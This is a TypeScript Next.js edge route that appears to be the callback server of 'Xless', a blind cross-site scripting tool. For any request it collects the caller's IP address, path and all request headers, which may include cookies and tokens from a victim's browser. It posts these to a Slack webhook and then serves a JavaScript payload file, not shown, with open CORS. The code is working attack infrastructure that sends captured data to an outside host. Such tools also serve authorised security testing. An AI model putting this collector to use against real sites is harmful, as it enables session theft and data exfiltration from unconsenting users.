import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'edge';

export async function GET(req: NextRequest) {
  const { pathname } = new URL(req.url);
  
  // Skip if it's a known API endpoint already handled
  const reserved = ['/api/c', '/api/health', '/api/examples', '/api/message'];
  if (reserved.includes(pathname)) {
    return new NextResponse(null, { status: 404 });
  }

  // Generate OOB Callback Alert
  const ip = req.headers.get('cf-connecting-ip') || req.headers.get('x-forwarded-for') || 'Unknown';
  let alert = '*XSSless: Out-of-Band Callback Alert*\n';
  alert += `• *IP Address:* \`${ip}\`\n`;
  alert += `• *Request URI:* \`${pathname}\`\n`;

  req.headers.forEach((value, key) => {
    alert += `• *${key}:* \`${value}\`\n`;
  });

  const slack_webhook = process.env.SLACK_INCOMING_WEBHOOK;
  if (slack_webhook) {
    try {
      await fetch(slack_webhook, {
        method: 'POST',
        body: JSON.stringify({
          username: 'XLess',
          text: alert,
          mrkdwn: true,
        }),
      });
    } catch (e) {
      console.error('Slack alert failed:', e);
    }
  }

  // On Edge runtime, we fetch the payload from our own public directory
  try {
    const payloadUrl = new URL('/payload.js', req.url);
    const payloadResponse = await fetch(payloadUrl);
    const payloadContent = await payloadResponse.text();
    
    return new NextResponse(payloadContent, {
      headers: {
        'Content-Type': 'application/javascript',
        'Access-Control-Allow-Origin': '*',
      },
    });
  } catch (error) {
    console.error('Error fetching payload.js:', error);
    return new NextResponse('console.error("Xless payload not found");', {
      headers: { 'Content-Type': 'application/javascript' }
    });
  }
}
